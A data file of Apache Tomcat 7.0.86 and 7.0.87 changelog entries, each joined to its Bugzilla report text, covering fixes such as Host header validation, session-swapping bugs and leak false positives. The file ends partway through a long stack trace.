Coyote|Tomcat 7.0.87 (violetagg)|add||Enable strict validation of the provided host name and port for all connectors. Requests with invalid host names and/or ports will be rejected with a 400 response. (markt)|||
Coyote|Tomcat 7.0.87 (violetagg)|fix||Implement the requirements of RFC 7230 (and RFC 2616) that HTTP/1.1 requests must include a Host header and any request that does not must be rejected with a 400 response. (markt)|||
Coyote|Tomcat 7.0.87 (violetagg)|fix||Implement the requirements of RFC 7230 that any HTTP/1.1 request that specifies a host in the request line, must specify the same host in the Host header and that any such request that does not, must be rejected with a 400 response. This check is optional and disabled by default. It may be enabled with the allowHostHeaderMismatch attribute of the Connector. (markt)|||
Coyote|Tomcat 7.0.87 (violetagg)|fix||Implement the requirements of RFC 7230 that any HTTP/1.1 request that contains multiple Host headers is rejected with a 400 response. (markt)|||
Coyote|Tomcat 7.0.87 (violetagg)|add|62273|Implement configuration options to work-around specification non-compliant user agents (including all the major browsers) that do not correctly %nn encode URI paths and query strings as required by RFC 7230 and RFC 3986. (markt)|Add support for alternate URL specification|"Browsers won't escape '{|}' in parameters area.
https://bugzilla.mozilla.org/show_bug.cgi?id=1451347
They state that they don't have to comply.

This link ""http://localhost:8090/jira/browse/SSP-15?jql=%20text%20=%20{ksi|delta}"" is completely legit for firefox and chrome.

Who should adjust?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62273
Jasper|Tomcat 7.0.87 (violetagg)|fix||Enable ECJ version 4.7 and later to be used as a drop in replacement for the ECJ version that ships with Apache Tomcat. (markt)|||
Jasper|Tomcat 7.0.87 (violetagg)|fix||Enable Java 10 to be specified as a JSP source and/or target if a newer ECJ version is used. (markt)|||
Jasper|Tomcat 7.0.87 (violetagg)|fix|62287|Do not rely on hash codes to test instances of ValueExpressionImpl for equality. Patch provided by Mark Struberg. (markt)|ValueExpressionImpl#equals is wrong|"Created attachment 35859 [details]
patch for ValueExpressionImpl

ValueExpressionImpl#equals is likely not enough.

The current code just compares the hashCode():

>return (obj instanceof ValueExpressionImpl && obj.hashCode() == this.hashCode());

It's possible that there is the same hashCode for different objects. For some Java Classes we alwasy get 0 even.


For better tracking: this came up during a bug report against Apache OpenWebBeans as reported by Holger Sunke.
https://issues.apache.org/jira/browse/OWB-1233"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62287
WebSocket|Tomcat 7.0.87 (violetagg)|fix|62301|Correct a regression in the fix for 61491 that didn't correctly handle a final empty message part in all circumstances when using PerMessageDeflate. (markt)|IOException Unable to unwrap data in versions after|"We are running into the following error where we are unable to establish a websocket connection using .Net:

java.io.IOException: Unable to unwrap data, invalid status [CLOSED]

This is working on Tomcat 8.0.x

This is not working for Tomcat version 8.5.x and 9.0.x (i.e. versions later than 8.5.x)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62301
Other|Tomcat 7.0.87 (violetagg)|fix||Avoid warning when running under Cygwin when the JAVA_ENDORSED_DIRS environment variable is not set. Patch provided by Zemian Deng. (markt)|||
Catalina|Tomcat 7.0.86 (violetagg)|fix|51195|Avoid a false positive report of a web application memory leak by clearing ObjectStreamClass$Caches of classes loaded by the web application when the web application is stopped. (markt)|"""Find leaks"" reports a false positive memory/classloader leak"|"If a webapp is using serialization of classes loaded by the webapp classloader then the ""Find leaks"" button will report a leak after undeploy of the webapp.
This is only partially true since the references that are still kept are only SoftReference instances.

This can be circumvented by adding code comparable to the changes in this commit https://github.com/huxi/logback/commit/d53e970963f84692889d438dd8a23c96137c15f2 prior to executing the garbage collection during ""Find leaks"".

I'd suggest to add such code to prevent the false positive warning.

See also http://jira.qos.ch/browse/LBCORE-205"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51195
Catalina|Tomcat 7.0.86 (violetagg)|fix|52688|Add support for the maxDays attribute to the AccessLogValve and ExtendedAccessLogValve. This allows the maximum number of days for which rotated access logs should be retained before deletion to be defined. (markt)|Add ability to remove old access log files [PATCHES]|"Created attachment 28344 [details]
Diff of AccessLogValve patch

The current AccessLogValve implementation uses a custom file writer instead of the normal log mechanism.  There are circumstances where it would be nice to have the power and flexibility of the standard logging capabilities.

This was briefly discussed in a email thread with subject 'AccessLogValve enhancement' from 2.15.2012

Attached is a proposed patch to add this capability, however I think it is still up for debate if this is a good enhancement.  This would be an option that people wouldn't have to use.

I believe it will work for me and is hopefully generally useful (otherwise it doesn't make a good enhancement and is just clutter.)   Earlier, I was trying to see how to do this by searching on the web and I found several others asking the same thing.  So, I think there are many others who at least think they want this feature.

Issues:
* (Potential performance, as mentioned previously)
* ""common"" pattern for AccessLogValve includes timestamp, which is also often included in log record headers.
* header messages (#VERSION, #FIELDS:, #SOFTWARE) won't repeat in log files, and are not
  necessarily useful in the initial one. (#FIELD is null, presumably because its attribute was later in my server.xml file.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52688
Catalina|Tomcat 7.0.86 (violetagg)|fix||Prevent Tomcat from applying gzip compression to content that is already compressed with brotli compression. Based on a patch provided by burka. (markt)|||
Catalina|Tomcat 7.0.86 (violetagg)|fix|62090|Null container names are not allowed. (remm)|NPE in o.a.t.util.modeler.Util when servlet-name does not exist in web.xml|"When using a web.xml that specifies a servlet element, but excludes servlet-name a NPE is observed and the webapp fails to deploy. A check should be added in the StandardWrapper and it should throw a ServletException when servlet-name is missing.

To reproduce, add a serlvet tag to your web.xml with no servlet-name. For example:

  <servlet>
    <servlet-class>com.example.servlets.HelloServlet</servlet-class>
  </servlet>

Then start Tomcat and observe the exception in catalina.out:

SEVERE [main] org.apache.catalina.core.ContainerBase.addChildInternal ContainerBase.addChild: start:
  org.apache.catalina.LifecycleException: Failed to initialize component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/test].StandardWrapper[null]]
    at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:441)
    ....
    at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:353)
    at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:493)
Caused by: java.lang.NullPointerException
    at org.apache.tomcat.util.modeler.Util.objectNameValueNeedsQuote(Util.java:26)
    at org.apache.catalina.core.StandardWrapper.getObjectNameKeyProperties(StandardWrapper.java:1619)
    at org.apache.catalina.util.LifecycleMBeanBase.initInternal(LifecycleMBeanBase.java:61)
    at org.apache.catalina.core.ContainerBase.initInternal(ContainerBase.java:885)
    at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
    ... 49 more

Setting xmlValidation=""true"" on the Context may handle this differently, but it's off by default so we should check for null and handle that case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62090
Catalina|Tomcat 7.0.86 (violetagg)|fix|62104|Fix programmatic login regression as the NonLoginAuthenticator has to be set for it to work (if no login method is specified). (remm)|Unable to login with HttpServletRequest.login(String, String) due to missing Authenticator (Tomcat 8.5.28)|"Overview:
Unable to login towards a Tomcat UserDatabase Realm when using the HttpServletRequest.login(String, String) method. This feature has worked up until Tomcat 8.5.28 (Worked with Tomcat 8.5.27). The problems occurs when trying to retrieve the Authenticator from the StandardContext. 

Setup:
* New installation of Tomcat 8.5.28
* Use the default Tomcat Realm configuration (UserDatabase)
* Add new user to the tomcat-users.xml

Steps to reproduce:
* Try to authenticate by using the method HttpServletRequest.login(String, String)

Expected result: 
* Login successful

Actual result: 
* Unable to retrieve the NonLoginAuthenticator from the StandardContext.getAuthenticator(). The valve(s) in the pipeline is not an instance of Authenticator (NonLoginAuthenticator). The method will return null, which will cause the Request.login method to throw a new ServletException with the error message ""no authenticator"".

Tomcat version:
Tomcat 8.5.28

Additional Information:
Might be related to issue 62036 which was part of the Tomcat 8.5.28 release."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62104
Catalina|Tomcat 7.0.86 (violetagg)|fix|62117|Improve error message in catalina.sh when calling kill -0 <pid> fails. Based on a suggestion from Mark Morschhaeuser. (markt)|catalina.sh contains misleading error message|"catalina.sh contains the following snippet:
----
kill -0 `cat ""$CATALINA_PID""` >/dev/null 2>&1
if [ $? -gt 0 ]; then
    echo ""PID file found but no matching process was found. Stop aborted.""
    exit 1
fi
----

Sending the signal 0 to a given PID checks if 
- any process with the given PID is running *and*
- you have the permission to send a signal to it.

Now assume the tomcat process was running as root and the catalina.sh is executed as user tomcat. Then the file $CATALINA_PID exists (as well as the process) but kill -0 returns an error because the tomcat user has no permissions to kill the root process.
So the message is incomplete, thus misleading.

The error message should instead be like
""PID file found but either no matching process was found or no permission to stop the process. Stop aborted.""

This problem not only exists in Tomcat 8.x but also in the source trunk and in Tomcat 9."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62117
Catalina|Tomcat 7.0.86 (violetagg)|fix|62118|Correctly create a JNDI ServiceRef using the specified interface rather than the concrete type. Based on a suggestion by √Ångel √Ålvarez P√°scua. (markt)|NamingContextListener creates ServiceRef objects with wrong parameter?|"The class NamingContextListener creates new ServiceRef objects this way

        Reference ref = new ServiceRef
            (service.getName(), service.getType(), service.getServiceqname(),
             service.getWsdlfile(), service.getJaxrpcmappingfile());

However, the constructor of the class ServiceRef is

    public ServiceRef(String refname, String serviceInterface, String[] serviceQname, String wsdl, String jaxrpcmapping) {


It seems the class is passing the type from the service when it should be the interface.

In my tests, the application fails with a ClassCastException because it's unable to use the interface (the type attribute of the object service is null), but if I change the service.getType by service.getInterface() ... it all works perfectly fine!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62118
Catalina|Tomcat 7.0.86 (violetagg)|fix||Fix for RequestDumperFilter log attribute. Patch provided by Kirill Romanov via Github. (violetagg)|||
Catalina|Tomcat 7.0.86 (violetagg)|fix|62123|Avoid ConcurrentModificationException when attempting to clean up application triggered RMI memory leaks on web application stop. (markt)|concurrentmodification exception on cleanup of RMI objects when stopping webapp|"Receive this exception occasionally when shutting down tomcat when webapp has left RMI objects in memory.  Does not always happen.

Similar to issue 31334, but different stack.

21-Feb-2018 02:05:58.192 SEVERE [Catalina-startStop-2] org.apache.catalina.core.ContainerBase.stopInternal A child container failed during stop
java.util.concurrent.ExecutionException: org.apache.catalina.LifecycleException: Failed to stop component [WebappLoader[StandardEngine[Catalina].StandardHost[localhost].StandardContext[]]]
               at java.util.concurrent.FutureTask.report(FutureTask.java:122)
               at java.util.concurrent.FutureTask.get(FutureTask.java:192)
               at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1003)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1441)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1430)
               at java.util.concurrent.FutureTask.run(FutureTask.java:266)
               at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
               at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
               at java.lang.Thread.run(Thread.java:745)
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [WebappLoader[StandardEngine[Catalina].StandardHost[localhost].StandardContext[]]]
               at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:441)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:267)
               at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5363)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1441)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1430)
               at java.util.concurrent.FutureTask.run(FutureTask.java:266)
               at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
               at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134)
               at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:997)
               ... 7 more
Caused by: java.util.ConcurrentModificationException
               at java.util.HashMap$HashIterator.nextNode(HashMap.java:1437)
               at java.util.HashMap$ValueIterator.next(HashMap.java:1466)
               at org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesRmiTargets(WebappClassLoaderBase.java:2081)
               at org.apache.catalina.loader.WebappClassLoaderBase.clearReferences(WebappClassLoaderBase.java:1521)
               at org.apache.catalina.loader.WebappClassLoaderBase.stop(WebappClassLoaderBase.java:1463)
               at org.apache.catalina.loader.WebappLoader.stopInternal(WebappLoader.java:443)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               ... 15 more
 
21-Feb-2018 02:05:58.193 SEVERE [Thread-115] org.apache.catalina.core.ContainerBase.stopInternal A child container failed during stop
java.util.concurrent.ExecutionException: org.apache.catalina.LifecycleException: A child container failed during stop
               at java.util.concurrent.FutureTask.report(FutureTask.java:122)
               at java.util.concurrent.FutureTask.get(FutureTask.java:192)
               at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1003)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.StandardService.stopInternal(StandardService.java:471)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:791)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.startup.Catalina.stop(Catalina.java:744)
               at org.apache.catalina.startup.Catalina$CatalinaShutdownHook.run(Catalina.java:845)
Caused by: org.apache.catalina.LifecycleException: A child container failed during stop
               at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1011)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1441)
               at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1430)
               at java.util.concurrent.FutureTask.run(FutureTask.java:266)
               at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
               at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
               at java.lang.Thread.run(Thread.java:745)
 
21-Feb-2018 02:05:58.195 SEVERE [Thread-115] org.apache.catalina.startup.Catalina.stop Catalina.stop
org.apache.catalina.LifecycleException: A child container failed during stop
               at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1011)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.StandardService.stopInternal(StandardService.java:471)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:791)
               at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
               at org.apache.catalina.startup.Catalina.stop(Catalina.java:744)
               at org.apache.catalina.startup.Catalina$CatalinaShutdownHook.run(Catalina.java:845)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62123
Catalina|Tomcat 7.0.86 (violetagg)|fix|62168|When using the PersistentManager honor a value of -1 for minIdleSwap and do not swap out sessions to keep the number of active sessions under maxActive. Patch provided by Holger Sunke. (markt)|PersistentManager.minIdleSwap=-1 does not disable swapping as documented.|"Created attachment 35758 [details]
Patch against Apache Tomcat trunk r1826332

Hello,

Documentation says:

minIdleSwap	
-----------
The minimum time in seconds a session must be idle before it is eligible to be swapped to disk to keep the active session count below maxActiveSessions. Setting to -1 means sessions will not be swapped out to keep the active session count down. If specified, this value should be less than that specified by maxIdleSwap. By default, this value is set to -1.


The sentence ""Setting to -1 means sessions will not be swapped out to keep the active session count down."" is not true: sessions are swapped when maxActiveSessions is reached even if minIdleSwap is -1.

The Method
/**
 * Swap idle sessions out to Store if too many are active
*/
org.apache.catalina.session.PersistentManagerBase.processMaxActiveSwaps()

does not consider the minIdleSwap < 0 case, but simply swaps out sessions if (timeIdle >= minIdleSwap) which behaves just like setting minIdleSwap=0.

This way, the manager likely swaps sessions that are still quite active at that moment in contrast of the administrators' intention who wantet to disable this feature.

I suggest attached patch to fix this.

Kind regards"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62168
Catalina|Tomcat 7.0.86 (violetagg)|fix|62172|Improve Javadoc for org.apache.catalina.startup.Constants and ensure that the constants are correctly used. (markt)|org.apache.catalina.startup.Constants specifies an absolute path for web.xml|"The value of org.apache.catalina.startup.Constants.ApplicationWebXml is ""/WEB-INF/web.xml"".

This is an absolute path. Consequently at least the Java NIO API resolves it to the absolute path /WEB-INF/web.xml. The same holds for the WarTracker constant.

All other constants in the class are specify relative paths:

ApplicationContextXml = ""META-INF/context.xml""
ApplicationWebXml     = ""/WEB-INF/web.xml""
DefaultContextXml     = ""conf/context.xml""
DefaultWebXml         = ""conf/web.xml""
HostContextXml        = ""context.xml.default""
HostWebXml            = ""web.xml.default""
WarTracker            = ""/META-INF/war-tracker"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=62172
Catalina|Tomcat 7.0.86 (violetagg)|fix|62175|Avoid infinite recursion, when trying to validate a session while loading it with PersistentManager. (fschumacher)|Infinite recursive session PersistentManager.swapIn loop with OOM|"Environment:
Windows 8 NTFS
Oracle JDK 1.8.0_152
Apache Tomcat 9.0.6
Apache OpenWebBeans 2.0.4 (OWB)
Session ID ABCDE in filesystem storage and containing an expired session.

TL;DR: Expired session is deserialized over and over again because OWB calls Request.getSession(false) in sessionDestroyed and ContainerBackgroundProcessor is unable to delete the session file while it is deserialized.


While Tomcat is starting up, I direct the Browser to request my application with session ABCDE which had been swapped out but is already expired.
Tomcat calls 
StandardSession.isValid() 
-> StandardSession.expire()
-> each registered HttpSessionListener.destroy()

Now OWB having a HttpSessionListener registered is calling RequestFacade.getSession(false) which expands to
-> PersistentManager.findSession()
-> PersistentManager.swapIn()
-> StandardSession.isValid()
... repeat until OutOfMemory

An important side condition is that FileStore.remove() fails for unknown reason. File.delete just returns false which is not very expressive. Maybe the session file is beeing read / locked accidentally the same time while the ContainerBackgroundProcessor tries to delete it. This could be caused by the session beeing read over and over again by that recursive loop where the most expansive operation is deserialization of the session, giving close to zero time for a successful delete.

[This is one reason why I better like Linux: deleting a file while it is read simply deletes the file.]

BTW: When the HTTP-Thread is blocked by a breakpoint, ContainerBackgroundProcessor succeeds in deleting the file and stops the recursion.


Here are the stacktraces of HTTP thread and ContainerBackgroundProcessor:

""http-nio-8080-exec-2"" #66 daemon prio=5 os_prio=0 tid=0x0000000021e9b000 nid=0xf94 at breakpoint[0x000000002c40a000]
   java.lang.Thread.State: RUNNABLE
        at my.web.common.application.listener.ApplicationListener.sessionDestroyed(ApplicationListener.java:112)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000d709d800> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000d61c8d48> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10008> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb100d8> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10150> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb101c8> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10240> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb102b8> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10330> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb103a8> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10420> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10498> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSession(Request.java:2374)
        at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:908)
        at org.apache.webbeans.web.context.WebContextsService.destroySessionContext(WebContextsService.java:553)
        at org.apache.webbeans.web.context.WebContextsService.endContext(WebContextsService.java:228)
        at org.apache.webbeans.servlet.WebBeansConfigurationListener.sessionDestroyed(WebBeansConfigurationListener.java:197)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:801)
        - locked <0x00000000fbb10510> (a org.apache.catalina.session.StandardSession)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:659)
        at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:736)
        - locked <0x00000000fa5be668> (a java.lang.Object)
        at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:488)
        at org.apache.catalina.connector.Request.doGetSession(Request.java:2909)
        at org.apache.catalina.connector.Request.getSessionInternal(Request.java:2635)
